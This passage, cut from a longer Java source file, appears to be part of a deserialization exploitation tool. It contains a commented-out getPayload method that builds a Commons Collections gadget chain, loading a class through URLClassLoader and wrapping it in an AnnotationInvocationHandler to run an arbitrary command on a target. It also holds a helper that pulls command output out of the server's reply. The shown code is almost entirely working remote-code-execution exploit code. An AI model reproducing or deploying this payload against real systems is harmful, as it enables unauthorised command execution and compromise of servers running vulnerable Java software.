		out.writeObject(instance);
		out.flush();
		out.close();
		return bo.toByteArray();
	}

	/*
	public byte[] getPayload(String command)
		    throws Exception
		  {
		    String ClassPath = "file:../.readme.html.tmp";
		    Transformer[] transforms = { new ConstantTransformer(URLClassLoader.class), 
		      new InvokerTransformer("getConstructor", new Class[] { Class[].class }, 
		      new Object[] { { URL[].class } }), 
		      new InvokerTransformer("newInstance", new Class[] { Object[].class }, 
		      new Object[] { { { new URL(ClassPath) } } }), 
		      new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] { "com.payload.RunCommand" }), 
		      new InvokerTransformer("getConstructor", new Class[] { Class[].class }, 
		      new Object[] { { String.class } }), 
		      new InvokerTransformer("newInstance", new Class[] { Object[].class }, 
		      new Object[] { { command } }) };
		    Transformer transformerChain = new ChainedTransformer(transforms);
		    Map innermap = new HashMap();
		    innermap.put("value", "value");
		    Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		    Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		    Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
		    ctor.setAccessible(true);
		    Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
		    ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		    ObjectOutputStream out = new ObjectOutputStream(bo);
		    out.writeObject(instance);
		    out.flush();
		    out.close();
		    return bo.toByteArray();
		  } 
	*/
	
	public String getCommandResult(byte[] response)
			throws UnsupportedEncodingException {
		String resultTmp = new String(response, "UTF-8");
		int x1 = resultTmp.indexOf("==========") + 10;
		int x2 = resultTmp.lastIndexOf("==========") - 1;
		String returnValue = "";
		if ((x1 >= 0) && (x2 >= 0)) {
			returnValue = resultTmp.substring(x1, x2).trim();
		} else {
			returnValue = resultTmp;
		}
		return returnValue;
	}
}
